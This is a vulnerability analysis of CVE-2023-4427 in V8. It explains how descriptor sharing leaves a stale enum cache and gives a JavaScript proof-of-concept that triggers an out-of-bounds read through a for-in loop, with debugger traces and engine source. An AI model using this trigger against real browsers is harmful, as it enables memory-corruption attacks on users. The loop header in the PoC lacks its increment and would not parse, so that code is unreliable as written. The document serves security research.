# CVE-2023-4427 

## Description

Out of bounds access in enum cache leads to fake object primitive.

## Analysis

When running code like this:

```javascript
obj1 = {}
obj2 = {}
// [1]
obj2.a = 1
```

v8 will create a new map for `obj2` and add a new transition pointer
```c
[#0] 0x7ffff6933834 → v8::internal::MapUpdater::ConstructNewMap()()
[#1] 0x7ffff6931c3b → v8::internal::MapUpdater::ReconfigureToDataField(v8::internal::InternalIndex, v8::internal::PropertyAttributes, v8::internal::PropertyConstness, v8::internal::Representation, v8::internal::Handle<v8::internal::FieldType>)()
[#2] 0x7ffff694428b → v8::internal::(anonymous namespace)::UpdateDescriptorForValue(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Map>, v8::internal::InternalIndex, v8::internal::PropertyConstness, v8::internal::Handle<v8::internal::Object>)()
[#3] 0x7ffff69440c1 → v8::internal::Map::PrepareForDataProperty(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Map>, v8::internal::InternalIndex, v8::internal::PropertyConstness, v8::internal::Handle<v8::internal::Object>)()
[#4] 0x7ffff69244bc → v8::internal::LookupIterator::PrepareForDataProperty(v8::internal::Handle<v8::internal::Object>)()
[#5] 0x7ffff69b2fcf → v8::internal::Object::SetDataProperty(v8::internal::LookupIterator*, v8::internal::Handle<v8::internal::Object>)()
[#6] 0x7ffff69b189c → v8::internal::Object::SetPropertyInternal(v8::internal::LookupIterator*, v8::internal::Handle<v8::internal::Object>, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::StoreOrigin, bool*)()
[#7] 0x7ffff69b1548 → v8::internal::Object::SetProperty(v8::internal::LookupIterator*, v8::internal::Handle<v8::internal::Object>, v8::internal::StoreOrigin, v8::Maybe<v8::internal::ShouldThrow>)()
[#8] 0x7ffff64c5fc5 → v8::internal::StoreIC::Store(v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Name>, v8::internal::Handle<v8::internal::Object>, v8::internal::StoreOrigin)()
[#9] 0x7ffff64d19ee → v8::internal::__RT_impl_Runtime_StoreIC_Miss(v8::internal::Arguments<(v8::internal::ArgumentsType)0>, v8::internal::Isolate*)()
```

This will also update the descriptor for all affected maps on the transition chain
```cpp
// Installs |new_descriptors| over the current instance_descriptors to ensure
// proper sharing of descriptor arrays.
void Map::ReplaceDescriptors(Isolate* isolate,
                             Tagged<DescriptorArray> new_descriptors) {
  PtrComprCageBase cage_base(isolate);
  // Don't overwrite the empty descriptor array or initial map's descriptors.
  if (NumberOfOwnDescriptors() == 0 ||
      IsUndefined(GetBackPointer(cage_base), isolate)) {
    return;
  }

  Tagged<DescriptorArray> to_replace = instance_descriptors(cage_base);
  // Replace descriptors by new_descriptors in all maps that share it. The old
  // descriptors will not be trimmed in the mark-compactor, we need to mark
  // all its elements.
  Tagged<Map> current = *this;
#ifndef V8_DISABLE_WRITE_BARRIERS
  WriteBarrier::ForDescriptorArray(to_replace,
                                   to_replace->number_of_descriptors());
#endif
  while (current->instance_descriptors(cage_base) == to_replace) {
    Tagged<Map> next;
    if (!current->TryGetBackPointer(cage_base, &next)) {
      break;  // Stop overwriting at initial map.
    }
    current->SetEnumLength(kInvalidEnumCacheSentinel);
    current->UpdateDescriptors(isolate, new_descriptors,
                               current->NumberOfOwnDescriptors());
    current = next;
  }
  set_owns_descriptors(false);
}
```

However, this process will not create a new enum cache, so the enum cache of the descriptor will remind uninitialized. Considering code like

```javascript
const object1 = {};
object1.a = 1;
const object2 = {};
object2.a = 16705;
object2.b = 3;
const object3 = {};
object3.a = 4;
object3.b = 5;
object3.c = 6;

for (let key in object2) { } // Trigger the enum cache creation [1]

function trigger(callback) {
    for (let key in object2) {
        callback(object2[key]);
    }
}

for (let i = 0; i < 0x50000) {
    trigger(_ => _);
    trigger(_ => _);
    trigger(_ => _);
}

trigger((value) => {
    object3.a = 1.1;             // Change the type of object3.a, update the map of object3 [2]
    for (let key in object1) { } // Trigger the enum cache creation [3]
});
```

In [1] the enum cache is created, and the map of `object2` is updated. In [2] the map of `object3` is updated. And the enum cache of the descriptor is uninitialized. But the length of the enumerable values of object2 has already been fetched before enter the loop body which is `2`. In [3] the enum cache is created again with only one key. This enum cache will be shared between all maps since they hold the same descriptor. Thus when iterating over `object2` with for-in loop again there will be an out of bounds access in the enum cache.

```
gef➤  call (void)_v8_internal_Print_Object(0xdd30015c735)
0xdd30015c735: [EnumCache] in OldSpace
 - map: 0x0dd3000001f1 <Map[12](ENUM_CACHE_TYPE)>
 - keys: 0x0dd30015c71d <FixedArray[1]>
 - indices: 0x0dd30015c729 <FixedArray[1]>
```

